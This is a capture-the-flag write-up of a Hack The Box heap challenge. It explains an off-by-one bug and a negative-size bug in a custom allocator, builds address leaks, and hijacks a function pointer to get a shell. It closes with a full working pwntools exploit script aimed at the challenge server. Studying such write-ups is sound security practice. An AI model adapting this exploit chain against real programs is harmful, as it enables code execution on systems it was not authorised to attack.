# Auth Or Out
This was a HTB pwn challenge that I did while practicing for PicoCTF 2026, and it has you exploiting a custom heap implementation. <br>
The basic setup is a standard "heap notes" challenge, where you can allocate, delete, view, and edit entries. 
<br> Each entry uses the following struct, with an additional allocation storing the data you enter:
```c
struct _Author {
    char Name[16];
    char Surname[16];
    char *Note;
    ulonglong Age;
    tPrintNote Print; //This contains a function pointer >:)
};


```
## The bug

Right away, I spotted one issue, an off-by-one when reading in the surname in the `edit_author` function. While you can't overflow into the note pointer, you can bump up against it and get a leak, which will be important later. 
The next issue happens when creating a new entry, specifically when you allocate the text entry stored in the `Note` field:
```c
notesz = get_number();
author->Age = notesz;
printf("Author Note size: ");
notesz = get_number();
if (notesz != 0) {
  author = authors[i];
  pcVar1 = ta_alloc(notesz + 1);
  author->Note = pcVar1;
  if (authors[i]->Note == (char *)0x0) {
    printf("Invalid allocation!");
    /* WARNING: Subroutine does not return */
    exit(0);
  }
  ...
```
When dealing with integer casting, I usually just test out a negative number instead of trying to read a decomp and figure out wether it'll work, so I'm not sure what the exact casting problem is but you *are* able to get a negative number into the custom malloc function, `ta_alloc`. Because of the following line inside of the allocator which rounds your allocation size up to the heap alignment, entering a small negative number will result in the allocator giving you a chunk of size 0, and the program allowing you to input effectively as much as you want since the size is casted to a `size_t`, which is unsigned. Since we can't edit the note field directly, we need to make a second `Author` struct on top of our zero-size allocation. The heap now looks like this:
```
+---------------+
| AUTHOR 1      |
|---------------| <-- AUTHOR 1 NOTE
| AUTHOR 2      | 
|---------------|
| AUTHOR 2 NOTE |
+---------------+
```
The next step is where where thigs start to diverge pretty significantly from libc's heap implementation.
Instead of metadata stored inside of free chunks, this implementation has metadata structs that are completely
separate from their data. In-use chunks' metadata structs are stored in the singly-linked list `heap->used`,
and new allocations are appended at the front.
When freeing, we scan down the `heap->used` list until we find a metadata struct with a matching address,
and move it to the freelist. Because of this, if we were to free author 1, with the 0-sized note, this search would hit author 2's
Author struct allocation before author 1's note allocation, and free it, creating a *very* dangerous UAF, considering that the struct has both a string pointer and a function pointer.
delete_author function was never called, and therefore the pointer was never removed from the `authors` list.
What we can do now is repeatedly free and re-allocate author 1 (since we can't edit existing notes). Each time, the `Author` struct goes back to its original spot, and the 
note allocation is on top of author 2's struct. 

## The exploit

The final chain that I came up with required a stack leak, a .text leak, and a libc leak. 
To start, we use that first bug for null-termination shenanigans to get a leak:
```py
newAuthor(lName = b'a' * 16, note=b'/bin/sh\x00')
editAuthor(1, lName = b'a' * 17)
stackLeak = unp64(printAuthor(1).split(b"Surname: ")[1][16:22])
log.info("STACK LEAK: " + hex(stackLeak))
```
This is only required to get an easy "/bin/sh" string, and I could have just used the one inside libc now that I think about it. Next, we set up our main two Author structs for the exploit described above (in slots 2 and 3 though, since we made 1 for our stack leak)
```py
newAuthor(noteSz=-2)
newAuthor(noteSz=32)
```
The next leak on our checklist is the `.text` one, and we can accomplish this by getting right up against author 2's function pointer so that it's printed when we view author 1.
```py
deleteAuthor(2)
newAuthor(noteSz=0x37, note=b'a'*0x30)

textLeak = unp64(printAuthor(2).split(b"[")[1][0x30:0x36])
gotAddr = textLeak + 0x201d6f
log.info(".text leak: " + hex(textLeak))
```
Finally, for our last leak, we overwrite author 2's `Note` pointer with an address in the GOT, so that printing author 2 gives us a libc address.
```py
deleteAuthor(2)

payload = (b'a' * 0x20) + p64(gotAddr)

newAuthor(noteSz=0x37, note=payload)
libcLeak = unp64(printAuthor(3).split(b"[")[1][0:6])
log.info("LIBC LEAK: " + hex(libcLeak))
```
Now, since the `Author->Note` pointer is the first argument to whatever function is pointed to in the `Author` struct, we just set up our `/bin/sh` string along with the address of `system()` calculated from our libc leak, and print out the corrupted `Author` struct. 
```py
deleteAuthor(2)

payload = b"/bin/sh\x00" + (b'a' * 0x18) + p64(stackLeak) + (b'a'*8) + p64(system)

print(hex(stackLeak + 0x20))
newAuthor(noteSz=0x37, note=payload)
proc.sendline(b"3")
proc.sendline(b"3")
proc.interactive()
```
And there's our shell! 
<br><br>
<b>Full script:</b>
```py
from pwn import *

#proc = process("./auth-or-out")
proc = remote("154.57.164.74", 30884)
def unp64(b):
    return int.from_bytes(b, "little")

def sendline(x):
    if isinstance(x, str):
        proc.sendline(x.encode('utf-8'))
        return
    proc.sendline(x)

def send(x):
    if isinstance(x, str):
        proc.send(x.encode('utf-8'))
        return
    proc.send(x)

def newAuthor(fName="a", lName="a", age=1, noteSz=64, note="a"):
    proc.recvuntil(b"Choice: ")
    sendline(b"1")
    proc.recvuntil(b": ")
    sendline(fName)
    proc.recvuntil(b": ")
    sendline(lName)
    proc.recvuntil(b": ")
    sendline(str(age))
    proc.recvuntil(b": ")
    sendline(str(noteSz))
    proc.recvuntil(b": ")
    sendline(note)

def editAuthor(idNo, fName="a", lName="a", age=1):
    proc.recvuntil(b"Choice: ")
    sendline(b"2")
    proc.recvuntil(b": ")
    sendline(str(idNo))
    proc.recvuntil(b": ")
    sendline(fName)
    proc.recvuntil(b": ")
    send(lName)
    proc.recvuntil(b": ")
    sendline(str(age))
   
def printAuthor(idNo):
    proc.recvuntil(b"Choice: ")
    sendline(b"3")
    sendline(str(idNo))
    proc.recvuntil(b"----------------------")
    return proc.recvuntil(b"----------------------")

def deleteAuthor(idNo):
    proc.recvuntil(b"Choice: ")
    sendline(b"4")
    proc.recvuntil(b": ")
    sendline(str(idNo))


newAuthor(lName = b'a' * 16, note=b'/bin/sh\x00')
editAuthor(1, lName = b'a' * 17)
stackLeak = unp64(printAuthor(1).split(b"Surname: ")[1][16:22])
log.info("STACK LEAK: " + hex(stackLeak))


newAuthor(noteSz=-2)
newAuthor(noteSz=32)

# LEAK AUTHOR->NOTE
# VULN AUTHOR
# VULN AUTHOR->NOTE AND VICT AUTHOR

deleteAuthor(2)
newAuthor(noteSz=0x37, note=b'a'*0x30)

bssLeak = unp64(printAuthor(2).split(b"[")[1][0x30:0x36])
gotAddr = bssLeak + 0x201d6f
log.info("BSS LEAK: " + hex(bssLeak))

deleteAuthor(2)

payload = (b'a' * 0x20) + p64(gotAddr)

newAuthor(noteSz=0x37, note=payload)
libcLeak = unp64(printAuthor(3).split(b"[")[1][0:6])
log.info("LIBC LEAK: " + hex(libcLeak))

system = libcLeak - 0x333a0

deleteAuthor(2)

payload = b"/bin/sh\x00" + (b'a' * 0x18) + p64(stackLeak) + (b'a'*8) + p64(system)

print(hex(stackLeak + 0x20))
newAuthor(noteSz=0x37, note=payload)


proc.interactive()
```
